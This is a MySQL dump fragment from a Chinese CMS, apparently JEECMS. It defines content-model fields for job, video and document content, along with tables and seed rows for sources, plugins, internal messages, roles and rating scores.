INSERT INTO `jc_model_item` VALUES ('251', '8', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('252', '8', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('253', '8', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('254', '8', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('255', '8', 'tplContent', '选择模型模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('256', '8', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('257', '8', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('258', '8', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('259', '8', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('260', '8', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('262', '8', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('263', '8', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('264', '8', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('265', '8', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('266', '8', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('268', '8', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('269', '8', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('270', '8', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('271', '8', 'channelId', '栏目', '1', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('272', '8', 'title', '岗位名称', '1', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('275', '8', 'tagStr', 'Tag标签', '7', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('279', '8', 'viewGroupIds', '浏览权限', '8', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('280', '8', 'topLevel', '固顶级别', '7', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('281', '8', 'releaseDate', '发布时间', '2', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('282', '8', 'typeId', '内容类型', '7', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('283', '8', 'tplContent', '指定模板', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('289', '8', 'txt', '职位描述', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('290', '8', 'deadline', '截止日期', '2', null, null, null, '3', '30', '留空永久有效', null, '5', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('291', '8', 'experience', '工作经验', '3', null, '1-3年,3-5年,5年以上,不限', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('292', '8', 'education', '最低学历', '3', '', '专科,本科,硕士,不限', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('293', '8', 'salary', '职位月薪', '4', null, '1500-2000,2000-3000,3000-5000,5000-8000,8000以上,面议', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('294', '8', 'workplace', '工作地点', '4', '', '北京,上海,深圳,广州,重庆,南京,杭州,西安,南昌', '', '3', '30', '', '', '7', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('295', '8', 'nature', '工作性质', '5', '', '全职,兼职', '', '3', '30', '', '', '8', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('296', '8', 'hasmanage', '管理经验', '5', '', '要求,不要求', '', '3', '30', '', '', '8', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('297', '8', 'nums', '招聘人数', '6', '', '1-3人,3-5人,5-10人,若干', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('298', '8', 'category', '职位类别', '6', null, '项目主管,java高级工程师,java工程师,网页设计师,测试人员,技术支持', null, '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('299', '9', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('300', '9', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('301', '9', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('302', '9', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('303', '9', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('304', '9', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('305', '9', 'tplContent', '内容模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('306', '9', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('307', '9', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('308', '9', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('309', '9', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('310', '9', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('312', '9', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('313', '9', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('314', '9', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('315', '9', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('316', '9', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('317', '9', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('318', '9', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('319', '9', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('320', '9', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('321', '9', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('322', '9', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('323', '9', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('324', '9', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('325', '9', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('326', '9', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('327', '9', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('328', '9', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('329', '9', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('330', '9', 'docPath', '文档', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('333', '9', 'downNeed', '下载需要财富', '11', null, null, null, null, null, null, null, '2', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('334', '9', 'isOpen', '是否开放', '11', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('335', '1', 'workflowId', '工作流', '12', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('338', '4', 'workflowId', '工作流', '10', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('339', '5', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('340', '6', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('342', '8', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('343', '9', 'workflowId', '工作流', '11', null, null, null, null, null, '留空则继承上级栏目设置，顶层为空无需审核', null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('344', '1', 'channelId', '栏目', '8', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null);
INSERT INTO `jc_model_item` VALUES ('403', '6', 'Director', '导演', '10', '', '', '', '1', '2', '', '', '1', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('404', '6', 'Starring', '主演', '10', '', '', '', '1', '30', '', '', '1', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('405', '6', 'VideoType', '视频类型', '10', null, '历史,古装,都市,喜剧,悬疑,动作,谍战,伦理,战争,惊悚', null, '3', '30', null, null, '7', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('406', '6', 'Video', '影片信息', '10', '', '正片,预告片', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('408', '1', 'contentImg', '内容图', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('409', '5', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '0', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('410', '6', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('412', '1', 'allowShare', '分享', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('413', '1', 'allowScore', '评分', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('414', '1', 'pictures', '图片集', '12', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('416', '1', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('417', '1', 'tplMobileContent', '指定手机模板', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('418', '2', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('419', '2', 'channelStatic', '栏目静态化', '9', null, null, null, null, null, null, null, '4', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('420', '2', 'contentStatic', '内容静态化', '9', null, null, null, null, null, null, null, '4', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('421', '4', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('422', '4', 'channelStatic', '栏目静态化', '9', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('423', '4', 'contentStatic', '内容静态化', '9', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('424', '4', 'tplMobileContent', '指定手机模板', '9', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('425', '5', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('426', '6', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('427', '9', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('431', '8', 'tplMobileChannel', '栏目手机模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('432', '8', 'tplMobileContent', '指定手机模板', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('438', '1', 'charge', '是否收费', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('439', '9', 'hy', '文档类型', '11', null, 'DOC,PPT,TXT,PDF', null, '3', '30', null, null, '8', '1', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('440', '9', 'em', '所属行业', '11', null, '科技,人文社科,经管营销,教育,办公应用', null, '3', '30', null, null, '8', '1', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('442', '4', 'size', '大小', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('443', '4', 'edition', '版本', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('444', '4', 'system', '支持系统', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('445', '4', 'bit', '位数', '10', '', '', '', '', '', '', '', '1', '0', '0', '1', '1', '0', '100', '100');
INSERT INTO `jc_model_item` VALUES ('456', '4', 'charge', '是否收费', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('457', '4', 'typeImg', '类型图', '9', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);
INSERT INTO `jc_model_item` VALUES ('458', '9', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null);

-- ----------------------------
-- Table structure for jc_origin
-- ----------------------------
DROP TABLE IF EXISTS `jc_origin`;
CREATE TABLE `jc_origin` (
  `origin_id` int(11) NOT NULL AUTO_INCREMENT,
  `origin_name` varchar(255) NOT NULL COMMENT '来源名称',
  `ref_count` int(11) NOT NULL DEFAULT '0' COMMENT '来源文章总数',
  PRIMARY KEY (`origin_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='来源';

-- ----------------------------
-- Records of jc_origin
-- ----------------------------
INSERT INTO `jc_origin` VALUES ('1', '新浪微博', '0');
INSERT INTO `jc_origin` VALUES ('2', '百度', '0');
INSERT INTO `jc_origin` VALUES ('3', '百度论坛', '0');
INSERT INTO `jc_origin` VALUES ('4', '百度贴吧', '0');
INSERT INTO `jc_origin` VALUES ('5', '新浪新闻', '0');
INSERT INTO `jc_origin` VALUES ('6', '腾讯新闻', '0');

-- ----------------------------
-- Table structure for jc_plug
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug`;
CREATE TABLE `jc_plug` (
  `plug_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '插件名称',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `description` varchar(2000) DEFAULT NULL COMMENT '描述',
  `author` varchar(255) DEFAULT NULL COMMENT '作者',
  `upload_time` datetime NOT NULL COMMENT '上传时间',
  `install_time` datetime DEFAULT NULL COMMENT '安装时间',
  `uninstall_time` datetime DEFAULT NULL COMMENT '卸载时间',
  `file_conflict` tinyint(1) NOT NULL DEFAULT '0' COMMENT '包含文件是否冲突',
  `is_used` tinyint(1) NOT NULL DEFAULT '0' COMMENT '使用状态(0未使用,1使用中)',
  `plug_perms` varchar(255) DEFAULT '' COMMENT '插件权限（,分隔各个权限配置）',
  `plug_repair` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否修复类插件(0 新功能插件 1修复类)',
  PRIMARY KEY (`plug_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='插件';

-- ----------------------------
-- Records of jc_plug
-- ----------------------------
INSERT INTO `jc_plug` VALUES ('1', '应用中心', '/WEB-INF/plug/plugStore.zip', '应用中心', 'caihongyixue', '2016-09-08 09:05:12', '2016-10-08 16:12:57', '2016-10-08 16:12:39', '0', '1', 'plugStore.center@store:center;storeConfig.edit@storeConfig:v_edit;storeConfig.update@storeConfig:o_update;', '0');

-- ----------------------------
-- Table structure for jc_plug_store_config
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug_store_config`;
CREATE TABLE `jc_plug_store_config` (
  `config_id` int(11) NOT NULL DEFAULT '1',
  `server_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口根地址',
  `password` varchar(255) NOT NULL DEFAULT '' COMMENT '应用商店密码',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jc_plug_store_config
-- ----------------------------
INSERT INTO `jc_plug_store_config` VALUES ('1', 'http://bbs.caihongyixue.com', '5f4dcc3b5aa765d61d8327deb882cf99');

-- ----------------------------
-- Table structure for jc_receiver_message
-- ----------------------------
DROP TABLE IF EXISTS `jc_receiver_message`;
CREATE TABLE `jc_receiver_message` (
  `msg_re_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  `msg_id` int(11) DEFAULT NULL COMMENT '发信的信件id',
  PRIMARY KEY (`msg_re_id`),
  KEY `jc_receiver_message_user_send` (`msg_send_user`),
  KEY `jc_receiver_message_user_receiver` (`msg_receiver_user`),
  KEY `jc_receiver_message_site` (`site_id`),
  KEY `jc_receiver_message_message` (`msg_re_id`),
  KEY `fk_jc_receiver_message_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_message` FOREIGN KEY (`msg_id`) REFERENCES `jc_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_receiver_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_receiver_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='站内信收信表';

-- ----------------------------
-- Records of jc_receiver_message
-- ----------------------------
INSERT INTO `jc_receiver_message` VALUES ('2', '1111', '1111', '2016-10-11 17:43:42', '1', '1', '1', '0', '3', null);
INSERT INTO `jc_receiver_message` VALUES ('4', 'qqw', 'qwwqwww', '2016-10-12 09:51:10', '1', '1', '1', '0', '3', null);

-- ----------------------------
-- Table structure for jc_role
-- ----------------------------
DROP TABLE IF EXISTS `jc_role`;
CREATE TABLE `jc_role` (
  `role_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `role_name` varchar(100) NOT NULL COMMENT '角色名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_super` char(1) NOT NULL DEFAULT '0' COMMENT '拥有所有权限',
  `role_level` int(11) NOT NULL DEFAULT '10' COMMENT '角色等级',
  PRIMARY KEY (`role_id`),
  KEY `fk_jc_role_site` (`site_id`),
  CONSTRAINT `fk_jc_role_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS角色表';

-- ----------------------------
-- Records of jc_role
-- ----------------------------
INSERT INTO `jc_role` VALUES ('1', null, '管理员', '10', '1', '10');

-- ----------------------------
-- Table structure for jc_role_permission
-- ----------------------------
DROP TABLE IF EXISTS `jc_role_permission`;
CREATE TABLE `jc_role_permission` (
  `role_id` int(11) NOT NULL,
  `uri` varchar(100) NOT NULL,
  KEY `fk_jc_permission_role` (`role_id`),
  CONSTRAINT `fk_jc_permission_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS角色授权表';

-- ----------------------------
-- Records of jc_role_permission
-- ----------------------------

-- ----------------------------
-- Table structure for jc_score_group
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_group`;
CREATE TABLE `jc_score_group` (
  `score_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '分组名',
  `description` varchar(1000) DEFAULT NULL COMMENT '描述',
  `enable` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否启用',
  `def` tinyint(3) NOT NULL DEFAULT '0' COMMENT '是否默认',
  `site_id` int(11) NOT NULL COMMENT '站点',
  PRIMARY KEY (`score_group_id`),
  KEY `fk_jc_score_group_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='FComment';

-- ----------------------------
-- Records of jc_score_group
-- ----------------------------
INSERT INTO `jc_score_group` VALUES ('1', '心情组', '心情组', '0', '1', '1');
INSERT INTO `jc_score_group` VALUES ('2', '星级评分', '星级评分', '1', '0', '1');

-- ----------------------------
-- Table structure for jc_score_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_item`;
CREATE TABLE `jc_score_item` (
  `score_item_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_group_id` int(11) NOT NULL COMMENT '评分组',
  `name` varchar(255) NOT NULL COMMENT '评分名',
  `score` int(11) NOT NULL COMMENT '分值',
  `image_path` varchar(255) DEFAULT NULL COMMENT '评分图标路径',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  PRIMARY KEY (`score_item_id`),
  KEY `fk_jc_score_item_group` (`score_group_id`),
  CONSTRAINT `fk_jc_score_item_group` FOREIGN KEY (`score_group_id`) REFERENCES `jc_score_group` (`score_group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COMMENT='评分项';

-- ----------------------------
-- Records of jc_score_item
-- ----------------------------
INSERT INTO `jc_score_item` VALUES ('1', '1', '开心', '1', '/r/cms/smilies/m1.gif', '1');
INSERT INTO `jc_score_item` VALUES ('2', '1', '板砖', '1', '/r/cms/smilies/m2.gif', '2');
INSERT INTO `jc_score_item` VALUES ('3', '1', '感动', '1', '/r/cms/smilies/m3.gif', '3');
INSERT INTO `jc_score_item` VALUES ('4', '1', '有用', '1', '/r/cms/smilies/m4.gif', '4');
INSERT INTO `jc_score_item` VALUES ('5', '1', '疑问', '1', '/r/cms/smilies/m5.gif', '5');
INSERT INTO `jc_score_item` VALUES ('6', '1', '难过', '1', '/r/cms/smilies/m6.gif', '6');
INSERT INTO `jc_score_item` VALUES ('7', '1', '无聊', '1', '/r/cms/smilies/m7.gif', '7');
INSERT INTO `jc_score_item` VALUES ('8', '1', '震惊', '1', '/r/cms/smilies/m8.gif', '8');
INSERT INTO `jc_score_item` VALUES ('9', '2', '非常差', '1', '', '1');
INSERT INTO `jc_score_item` VALUES ('10', '2', '差', '2', '', '2');
INSERT INTO `jc_score_item` VALUES ('11', '2', '一般', '3', '', '3');
INSERT INTO `jc_score_item` VALUES ('12', '2', '好', '4', '', '4');
INSERT INTO `jc_score_item` VALUES ('13', '2', '非常好', '5', '', '5');

-- ----------------------------
-- Table structure for jc_score_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_score_record`;
CREATE TABLE `jc_score_record` (
  `score_record_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_item_id` int(11) NOT NULL COMMENT '评分项',
  `content_id` int(11) NOT NULL COMMENT '内容',
  `score_count` int(11) NOT NULL COMMENT '评分次数',
  PRIMARY KEY (`score_record_id`),
  KEY `fk_jc_record_score_item` (`score_item_id`),
  KEY `index_score_record_content` (`content_id`),
  CONSTRAINT `fk_jc_record_score_item` FOREIGN KEY (`score_item_id`) REFERENCES `jc_score_item` (`score_item_id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COMMENT='评分纪录';

-- ----------------------------
-- Records of jc_score_record
-- ----------------------------
INSERT INTO `jc_score_record` VALUES ('3', '1', '33', '17');
INSERT INTO `jc_score_record` VALUES ('4', '5', '33', '1');
INSERT INTO `jc_score_record` VALUES ('6', '1', '32', '2');
INSERT INTO `jc_score_record` VALUES ('7', '8', '12', '1');
INSERT INTO `jc_score_record` VALUES ('10', '1', '132', '1');
INSERT INTO `jc_score_record` VALUES ('11', '1', '113', '11');
INSERT INTO `jc_score_record` VALUES ('12', '1', '27', '2');
INSERT INTO `jc_score_record` VALUES ('13', '1', '39', '18');
INSERT INTO `jc_score_record` VALUES ('14', '1', '131', '13');
INSERT INTO `jc_score_record` VALUES ('15', '1', '30', '41');
INSERT INTO `jc_score_record` VALUES ('16', '1', '14', '13');
INSERT INTO `jc_score_record` VALUES ('17', '1', '130', '12');
INSERT INTO `jc_score_record` VALUES ('18', '1', '112', '18');
INSERT INTO `jc_score_record` VALUES ('19', '1', '111', '12');
